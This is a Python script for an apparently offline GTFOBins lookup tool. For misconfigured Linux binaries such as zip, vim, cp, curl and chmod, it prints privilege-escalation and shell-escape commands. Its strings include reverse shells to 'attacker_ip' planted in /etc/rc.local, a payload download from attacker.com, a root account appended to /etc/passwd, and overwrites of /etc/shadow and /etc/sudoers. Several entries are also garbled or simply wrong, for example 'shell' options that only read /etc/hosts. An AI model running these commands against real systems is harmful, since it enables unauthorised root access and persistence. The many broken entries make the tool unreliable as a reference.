#Off-Grid written by S14X0r
#A GTFO Bins lookup tool for a CLI

def print_logo():
    logo = '''
 OOO   FFFFF  FFFFF    GGG   RRRR   III  DDDD  
O   O  F      F      G       R   R   I   D   D 
O   O  FFFF   FFFF   G  GG   RRRR    I   D   D 
O   O  F      F      G   G   R  R    I   D   D 
 OOO   F      F       GGG    R   R   III  DDDD  
    '''
    print(logo)
#Function for gtfo_bins that will hold the different commands and responses
def gtfo_bins(zip_command, zip_options):
    bins = []
    
    # Handle the 'zip' command with different options
    if zip_command == "zip":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp -u) zip $TF /etc/hosts -T -TT 'sh #'rm $TF")
        elif zip_options == "file-read":
            bins.append("LFILE=file-to-read TF=$(mktemp -u) zip $TF $LFILE unzip -p $TF'")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF")
        elif zip_options == "suid":
            bins.append("TF=$(mktemp -u) ./zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF")
    
    #Adding additional GTFO bins for other misconfigured binaries
    elif zip_command == "7zip":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp -u) 7z x -so /etc/hosts | sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so")
        elif zip_options == "suid":
            bins.append("7z e /etc/hosts -o$TF; chmod +s $TF")

    elif zip_command == "base64":
        if zip_options == "Shell":
            bins.append("echo 'base64 -d /etc/hosts' | sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read base64 '$LFILE' | base64 --decode")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read sudo base64 '$LFILE' | base64 --decode")
        elif zip_options == "suid":
            bins.append("LFILE=file_to_read ./base64 '$LFILE' | base64 --decode")

    elif zip_command == "bash":
        if zip_options == "Shell":
            bins.append("bash")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write bash -c 'echo DATA > $LFILE'")
        elif zip_options == "file-read":
            bins.append ("export LFILE=file_to_read bash -c 'echo '$(<$LFILE)''")
        elif zip_options == "sudo":
            bins.append("sudo bash")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which bash) . ./bash -p")
    
    elif zip_command == "awk":
        if zip_options == "Shell":
            bins.append ("awk 'BEGIN {system(""/bin/sh"")}'")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read awk '//' ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("sudo awk 'BEGIN {system(""/bin/sh"")}'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which awk) . ./awk 'BEGIN {system(""/bin/sh"")}'")
        
    elif zip_command == "base32":
        if zip_options == "Shell":
             bins.append("echo 'base32 -d /etc/hosts' | sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read base32 ""$LFILE"" | base32 --decode")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\n sudo base32 ""$LFILE"" | base32 --decode")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which base32) .\n LFILE=file_to_read base32 ""$LFILE"" | base32 --decode")
    
    elif zip_command == "busybox":
        if zip_options == "Shell":
            bins.append("busybox sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\n./busybox cat ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write busybox sh -c 'echo ""DATA"" > $LFILE'")
        elif zip_options == "sudo":
            bins.append("sudo busybox sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which busybox) .\n./busybox sh")
        
    elif zip_command == "cat":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo cat ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cat) .\nLFILE=file_to_read\n./cat ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncat ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("cat /etc/hosts")
        elif zip_options == "file-write":
            bins.append("echo 'malicious content' | cat > /etc/hosts\n")
            bins.append("echo 'malicious content' | cat > /etc/passwd\n")
            bins.append("echo 'malicious content' | cat > /etc/shadow\n")
            bins.append("echo 'malicious content' | cat > /etc/sudoers\n") 

    elif zip_command == "neofetch":
        if zip_options == "sudo":
            bins.append("TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF")
        elif zip_options == "suid":
            bins.append("neofetch --command 'bash'") 
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nneofetch --ascii $LFILE")
        elif zip_options == "file-write":
            bins.append("echo ""Some content"" | tee /path/to/file")
        elif zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho 'exec /bin/sh' >$TF\n neofetch --config $TF")

    elif zip_command == "cp":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_write\necho ""DATA"" | sudo cp /dev/stdin ""$LFILE""")
        elif zip_options == "suid":
            bins.append("LFILE=file_to_write\necho ""DATA"" | ./cp /dev/stdin ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("echo ""bash -i >& /dev/tcp/attacker_ip/4444 0>&1"" > /tmp/malicious.sh\ncp /tmp/malicious.sh /etc/rc.local")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncp ""$LFILE"" /dev/stdout")
        elif zip_options == 'file-write':
            bins.append("LFILE=file_to_write\necho ""DATA"" | cp /dev/stdin ""$LFILE""")
        
    elif zip_command == "curl":
        if zip_options == "sudo":
            bins.append("URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE")
        elif zip_options == "suid":
            bins.append("URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl ""file://$TF"" -o ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=/tmp/file_to_read\ncurl file://$LFILE")
        elif zip_options == "Shell":
            bins.append("curl -sL http://attacker_ip/malicious.sh > /etc/rc.local")

    elif zip_command == "chmod":
        if zip_options == "Shell":
            bins.append('echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/reverse_shell.sh\nchmod u+s /tmp/reverse_shell.sh')
        elif zip_options == "sudo":
            bins.append('LFILE=file_to_change\nsudo chmod 6777 $LFILE')
        elif zip_options == "suid":
            bins.append("LFILE=file_to_change\n./chmod 6777 $LFILE")
        elif zip_options == "file-write":
            bins.append("echo ""attacker:x:0:0:attacker:/root:/bin/bash"" >> /etc/passwd")
        elif zip_options == "file-read":
            bins.append("chmod 644 /var/log/auth.log")
#Ignore the warning for the dosbox options when running the program! 
    elif zip_command == "dosbox":
        if zip_options == "file-write":
            bins.append("LFILE='\path\ to\ file_to_write'\ndosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit")
        elif zip_options == "file-read":
            bins.append("LFILE='\path\ to\ file_to_read'\ndosbox -c 'mount c /' -c ""type c:$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE='\path\ to\ file_to_write'\nsudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit")
        elif zip_options == "suid":
            bins.append("LFILE='\path\ to\ file_to_write'\n./dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"": -c exit")
        elif zip_options == "Shell":
            bins.append("Shell not available, please choose other options.")
            
    elif zip_command == "dmesg":
        if zip_options == "Shell":
            bins.append("dmesg -H\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo dmesg -H\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndmesg -rF ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("dmesg > /var/log/syslog")
        elif zip_options == "suid":
            bins.append("dmesg >> /etc/passwd\necho ""attacker:x:0:0:attacker:/root:/bin/bash"" >> /etc/passwd")

    elif zip_command == "gcc":
        if zip_options == "Shell":
            bins.append("gcc -wrapper /bin/sh,-s ")
        elif zip_options == "sudo":
            bins.append("sudo gcc -wrapper /bin/sh,-s .")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ngcc -x c -E ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE")
        elif zip_options == "suid":
            bins.append("Run the sudo option!")
    
    elif zip_command == "vim" or zip_command == "vi":
        if zip_options == "Shell":
            bins.append("vim -c ':!/bin/sh'")
        elif zip_options == "sudo":
            bins.append("sudo vim -c ':!/bin/sh'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which vim) .\n./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'")
        elif zip_options == "file-write":
            bins.append("vim file_to_write\niDATA\n^[\nw")
        elif zip_options == "file-read":
            bins.append("vim file_to_read")

    elif zip_command == "nano":
        if zip_options == "Shell":
            bins.append("nano\n^R^X\nreset; sh 1>&0 2>&0")
        elif zip_options == "sudo":
            bins.append("sudo nano\n^R^X\nreset; sh 1>&0 2>&0")
        elif zip_options == "suid":
            bins.append("./nano -s /bin/sh\n/bin/sh\n^T")
        elif zip_options == "file-write":
            bins.append("nano file_to_write\nDATA\n^O")
        elif zip_options == "file-read":
            bins.append("nano file_to_read")

    elif zip_command == "zsh":
        if zip_options == "Shell":
            bins.append("zsh")
        elif zip_options == "sudo":
            bins.append("sudo zsh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which zsh) .\n./zsh")
        elif zip_options == "file-read":
            bins.append("export LFILE=file_to_read\nzsh -c 'echo ""$(<$LFILE)""'")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'")

    elif zip_command == "dd":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_write\necho ""data"" | sudo dd of=$LFILE	")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dd) .\nLFILE=file_to_write\necho ""data"" | ./dd of=$LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\necho ""DATA"" | dd of=$LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndd if=$LFILE")
#If there are any other misconfigurations run the other option
    elif zip_command == "other":
        if zip_options == "Shell": #This will print out hints for more GTFO bins!
            bins.append("Please refer to the GTFO bins website for more!")
        elif zip_options == "sudo": #This will give a git clone command to run when more bins are needed but available
            bins.append("If git is install please run \ngit clone https://github.com/GTFOBins/GTFOBins.github.io.git\nThen cd into the directory and then into the folder marked _gtfobins")
            
    return bins

def main():
    print_logo()
    print("*If a GTFO bin is not found please type 'other' then 'sudo'*")
    start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")

    #Tool selection for Linux misconfigurations
    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "other":  
        zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")

        if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
            bins = gtfo_bins(start, zip_options)  # Call the gtfo_bins function with the correct arguments
            print("\nSuggested GTFO Bins:\n")
            for bin in bins:
                print(bin)
        else:
            print("\nInvalid option for the chosen tool.\n")
    else:
        print("\nTool not found. Please enter a valid tool name (e.g., 'zip', '7zip', 'base64' or 'other').\n")

if __name__ == "__main__":
    main()